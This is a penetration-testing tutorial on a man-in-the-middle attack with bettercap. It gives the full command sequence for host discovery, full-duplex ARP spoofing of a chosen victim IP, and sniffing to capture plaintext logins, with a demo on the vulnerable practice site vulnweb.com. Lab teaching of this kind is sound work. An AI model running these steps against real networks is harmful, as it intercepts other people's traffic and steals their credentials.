# Wi-Fi Penetration Testing — Part 3
## Man-in-the-Middle Attack Using Bettercap

> ⚠️ **Disclaimer:** This material is for **educational purposes only**. Performing these attacks on networks or devices without explicit permission is **illegal** and unethical. Always test in a controlled lab environment with your own devices.

---

## Overview

This section walks through a complete **Man-in-the-Middle (MitM) attack** using `bettercap` — from installation and interface selection, through ARP spoofing, to live credential capture via traffic sniffing.

---

## 1. Installation

Install `bettercap` with root privileges:

```bash
sudo apt install bettercap
```

---

## 2. Identify Your Network Interface

Before launching bettercap, identify which network interface to use:

```bash
ifconfig
```

This lists all available network interfaces (e.g., `eth0`, `wlan0`, `lo`). Look for the one connected to your target network — typically `wlan0` for Wi-Fi.

---

## 3. Launch Bettercap on the Target Interface

```bash
sudo bettercap -iface wlan0
```

The `-iface` flag tells bettercap which interface to operate on. Replace `wlan0` with your actual interface name if different.

---

## 4. Step 1 — Discover Devices on the Network

Scan for all active devices connected to the same network:

```bash
net.probe on   # Sends out probes to discover live hosts
net.show       # Displays a table of all found devices
```

`net.show` outputs a table containing:

| Field | Description                        |
|-------|------------------------------------|
| IP    | Device's IP address                |
| MAC   | Device's physical hardware address |
| Name  | Hostname (if resolvable)           |

Pick your target IP from this list for the next step.

---

## 5. Step 2 — ARP Spoofing

### What is ARP Spoofing?

**ARP (Address Resolution Protocol)** is how devices on a network map IP addresses to physical (MAC) addresses. When a device wants to communicate with an IP, it broadcasts "Who has this IP?" and the owner replies with its MAC address.

By sending **forged ARP replies**, we can trick both the target device and the router into thinking *our* machine is the other party — inserting ourselves silently in the middle of all their communication.

### Enable Full Duplex Mode

```bash
set arp.spoof.fullduplex true
```

Full duplex mode intercepts traffic in **both directions**:
- From the **target → router** (outbound requests)
- From the **router → target** (inbound responses)

Without this, you'd only see traffic in one direction.

### Set the Target

```bash
set arp.spoof.targets <TARGET_IP>   # Replace with the victim device's IP from net.show
```

### Start ARP Spoofing

```bash
arp.spoof on
```

At this point, your machine is **positioned between the target and the router**. All traffic between them now flows through you — neither side knows.

---

## 6. Step 3 — Sniff Network Traffic

With MitM position established, start capturing all passing traffic:

```bash
net.sniff on
```

Bettercap now captures and analyzes every packet flowing through your machine. Any **unencrypted (HTTP) traffic** — including login credentials — will be visible in plaintext.

---

## 7. Demo — Capturing Credentials on a Vulnerable Site

### Target Site: `vulnweb.com`

**Vulnweb** is a deliberately vulnerable website designed for security testing. It's safe and legal to practice on.

**Steps:**
1. On the target device, open a browser and navigate to the Acuart login form on `vulnweb.com`
2. Enter any fake credentials (e.g., `username: testuser`, `password: testpass`)
3. On your Kali machine, watch the `net.sniff` output

**Result:** The submitted username and password appear in **plaintext** in bettercap's output — because the site uses HTTP with no encryption.

> 🔍 **Why does this work?** HTTPS encrypts traffic end-to-end, so credentials would be unreadable even in a MitM position. HTTP sends everything in the clear, making it trivially interceptable.

---

## Full Attack Flow

```
[1] sudo bettercap -iface wlan0
         │
         ▼
[2] net.probe on / net.show
    → Discover target IP
         │
         ▼
[3] set arp.spoof.fullduplex true
    set arp.spoof.targets <IP>
    arp.spoof on
    → MitM position established
         │
         ▼
[4] net.sniff on
    → All plaintext traffic captured
         │
         ▼
[5] Victim logs into HTTP site
    → Credentials visible in plaintext
```

---

## Tools & Commands Reference

| Command                              | Purpose                                              |
|--------------------------------------|------------------------------------------------------|
| `sudo bettercap -iface wlan0`        | Launch bettercap on a specific interface             |
| `net.probe on`                       | Actively scan for devices on the network             |
| `net.show`                           | Display all discovered devices                       |
| `set arp.spoof.fullduplex true`      | Intercept traffic in both directions                 |
| `set arp.spoof.targets <IP>`         | Set the victim device's IP                           |
| `arp.spoof on`                       | Start ARP poisoning / MitM positioning               |
| `net.sniff on`                       | Begin capturing and analyzing network traffic        |

---

## Key Concepts

| Term             | Meaning                                                                            |
|------------------|------------------------------------------------------------------------------------|
| MitM             | Man-in-the-Middle — attacker intercepts communication between two parties          |
| ARP              | Protocol that maps IP addresses to MAC addresses on a local network                |
| ARP Spoofing     | Sending fake ARP messages to redirect traffic through the attacker's machine       |
| Full Duplex      | Intercepting traffic flowing in both directions (target↔router)                    |
| net.sniff        | Bettercap module that captures and displays passing network packets                |
| Plaintext        | Unencrypted data — readable directly without any decryption                        |
| vulnweb.com      | A deliberately vulnerable site for legally practicing web/network attack techniques|